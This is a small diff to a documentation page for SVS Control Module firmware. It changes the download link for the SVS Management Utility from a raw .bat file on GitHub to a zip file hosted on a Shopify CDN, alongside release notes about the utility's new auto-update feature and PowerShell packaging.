@@ -32,7 +32,7 @@ title: SVS Control Module Firmware
 
 **SVS Management Utility 1.4 adds auto update capability. It can automatically download the latest firmware as well as check for updates to the management utility scripts. This version of the management utility is no longer packaged as a .exe file due to antivirus false positives that were caused by the compilation tools I was previously using to compile the script as an exe. The utility is now distributed as a powershell script with a .bat file used to launch the script.**
 
-**[Right Click and "Save link as" to Download Latest SVS Management Utility](https://github.com/Arthrimus/SVS_Firmware_Repository/raw/refs/heads/main/SVS%20Control%20Module%20Firmwares/Scripts/SVS%20Management%20Utility.bat)**
+**[Download the latest SVS Management Utility](https://cdn.shopify.com/s/files/1/0903/4271/9805/files/SVS_Management_Utility.zip?v=1777911837)**
 
 ![](./Images/SVS_Management_Utility.png)
 
